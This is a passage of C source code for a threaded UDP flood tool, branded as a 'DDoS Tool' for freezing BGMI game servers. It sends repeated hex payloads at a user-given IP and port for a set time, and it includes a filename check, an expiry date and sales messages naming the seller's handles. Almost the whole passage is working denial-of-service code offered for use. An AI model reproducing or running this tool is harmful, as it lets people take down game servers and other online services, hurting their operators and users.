    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
    };
    int payload_count = sizeof(payloads) / sizeof(payloads[0]);

    // Create socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed. Try another target.");
        pthread_exit(NULL);
    }

    // Setup server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time; // Set attack end time

    // Continuously send payloads until time runs out
    while (time(NULL) <= endtime && keep_running) {
        for (int i = 0; i < payload_count; i++) {
            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                packets_failed++;
                perror("Send failed.");
            } else {
                packets_sent++;
            }
        }
    }

    close(sock); // Close socket after attack
    pthread_exit(NULL);
}

void check_program_name(char *program_name) {
    if (strcmp(basename(program_name), "rare") != 0) {
        printf("LODE FILE KA NAME rare RAKH APNA NAME DALE GA LAND KE\n");
        exit(EXIT_FAILURE);
    }
}

int main(int argc, char *argv[]) {
    signal(SIGINT, handle_sigint); // Handle Ctrl+C gracefully

    check_program_name(argv[0]);

    // Get current time
    time_t now;
    time(&now);
    struct tm *local = localtime(&now);

    // Check if the current date is past October 15, 2024
    if (local->tm_year + 1900 > EXPIRATION_YEAR ||
        (local->tm_year + 1900 == EXPIRATION_YEAR && local->tm_mon + 1 > EXPIRATION_MONTH) ||
        (local->tm_year + 1900 == EXPIRATION_YEAR && local->tm_mon + 1 == EXPIRATION_MONTH && local->tm_mday > EXPIRATION_DAY)) {
        printf("LODE YE FILE EXPIRE HAI OWNER = @RARExOWNER SE KHARID\n");
        printf("AUR BULNA MAT @RARECRACKS KO JOIN KARNA\n");
        return EXIT_FAILURE;
    }

    printf("✨ Welcome to RARECRACKS DDoS Tool! ✨\n");

    // Check for correct number of arguments
    if (argc != 5) {
        usage();
    }

    // Get arguments
    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data *data_array = malloc(threads * sizeof(struct thread_data));

    // Display initial watermark
    printf("✦•┈๑⋅⋯ ⋯⋅๑┈•✦✦•┈๑⋅⋯ ⋯⋅๑┈•✦✦•┈๑⋅⋯ ⋯⋅๑┈•✦\n");
    printf("🌊🌊🌊 ATTACK BY @RARExOWNER 🌊🌊🌊\n");
    printf("🎯 TARGETING IP: %s\n", ip);
    printf("📍 TARGET PORT: %d\n", port);
    printf("⏳ ATTACK DURATION: %d SECONDS\n", duration);
    printf("💥 THREADS: %d\n", threads);
    printf("⚡ METHOD: BGMI SERVER FREEZE BY RARECRACKS TEAM ⚡\n");
    printf("✦•┈๑⋅⋯ ⋯⋅๑┈•✦✦•┈๑⋅⋯ ⋯⋅๑┈•✦✦•┈๑⋅⋯ ⋯⋅๑┈•✦\n");

    // Create attack threads
    for (int i = 0; i < threads; i++) {
        data_array[i].ip = ip;
        data_array[i].port = port;
        data_array[i].time = duration;

        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data_array[i]) != 0) {
            perror("Thread creation failed.");
            free(thread_ids);
            free(data_array);
            exit(1);
        }
    }

    // Monitor the attack progress and display remaining time
    time_t start_time = time(NULL);
    while (keep_running && time(NULL) - start_time < duration) {
        int remaining_time = duration - (time(NULL) - start_time);
        printf("\033[A\033[K"); // Clears the current line
        printf("⏳ Remaining time for the attack: %d seconds\n", remaining_time);
        sleep(1);
    }

    // Wait for all threads to finish
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    // Final results
    printf("────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──\n");
    printf("🎉 SCRIPT CODED BY @RARECRACKS 🎉\n");
    printf("💻 OWNER = @RARExOWNER 💻\n");
    printf("✨ ATTACK FINISHED: ✨\n");
    printf("✅ PACKETS SENT: %ld\n", packets_sent);
    printf("✅ SUCCESSFUL PACKETS: %ld\n", packets_sent - packets_failed);
    printf("❌ FAILED PACKETS: %ld\n", packets_failed);
    printf("📦 DATA DELIVERED: %ld KB\n", (packets_sent * strlen(payloads[0])) / 1024);
    printf("📦 DATA DELIVERED (IN GB): %.2f GB\n", (packets_sent * strlen(payloads[0])) / 1024.0 / 1024.0 / 1024.0);
    printf("────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──\n");

    free(thread_ids);
    free(data_array);
    return 0;
}
